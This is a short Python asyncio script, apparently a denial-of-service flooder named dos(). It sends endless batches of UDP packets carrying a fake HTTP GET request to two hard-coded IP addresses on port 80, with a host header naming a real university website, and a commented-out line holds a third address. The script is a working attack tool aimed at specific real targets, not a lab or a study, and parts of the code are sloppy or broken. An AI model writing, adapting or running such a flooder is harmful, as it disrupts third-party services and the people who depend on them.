#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio
from time import time

async def dos():
    message = "GET / HTTP/1.1\r\n HOST:www.jju.edu.cn \r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3;     .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n Content-Length: 92\r\n"
    while True:
        i=2000
        while(i>0):
            try:
                if(i%2):
                    connect = loop.create_datagram_endpoint(
                        lambda: EchoClientProtocol(message, loop),
                        remote_addr=("58.17.121.179" ,80))
                else:
                    connect = loop.create_datagram_endpoint(
                        lambda: EchoClientProtocol(message, loop),
                        remote_addr=("58.17.121.180" ,80))

                await connect
            except Exception as e:
                print(e)
                await asyncio.sleep(1)
            i -= 1
        await asyncio.sleep(1)


class EchoClientProtocol:
    def __init__(self, message, loop):
        self.start=0
        self.end=0
        self.message = message
        self.loop = loop
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print('Send:', self.message)
        self.transport.sendto(self.message.encode())
        self.start=time()
        print("time=",self.start)
        self.transport.abort()
        #try:
            #i=0
            #while True:
                #i+=1
                #h="h"+str(i)+":hh"
                #self.transport.sendto(h.encode())




    def datagram_received(self, data, addr):
        print("Received:", data.decode())

        print("Close the socket")
        self.transport.close()

    def error_received(self, exc):
        print('Error received:', exc)
        self.transport.close()

    def connection_lost(self, exc):
        print("Socket closed, stop the event loop")
        self.end=time()
        print("time=",self.end)
        print("--------TIME---------\n",self.end-self.start)

loop = asyncio.get_event_loop()
message = "GET / HTTP/1.1\r\n HOST: host\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3;     .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n Content-Length: 42\r\n"
#connect = loop.create_datagram_endpoint(
    #lambda: EchoClientProtocol(message, loop),
    #remote_addr=("218.193.237.28" ,80))
#transport, protocol = loop.run_until_complete(connect)
asyncio.ensure_future(dos())
loop.run_forever()
transport.close()
loop.close()
